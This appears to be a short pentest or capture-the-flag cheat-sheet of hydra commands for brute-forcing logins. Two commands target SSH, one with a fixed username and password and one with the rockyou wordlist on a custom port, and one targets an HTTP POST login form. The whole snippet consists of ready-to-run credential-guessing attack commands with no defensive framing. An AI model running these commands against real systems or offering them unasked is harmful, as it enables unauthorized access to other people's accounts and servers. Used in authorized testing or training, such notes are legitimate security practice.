
```powershell

# ssh bruteforce
hydra -l george -p 'funnel123#!#' <target_IP> ssh
hydra -l username.txt -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://<target_IP>  # -s for port


#  Webform
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

```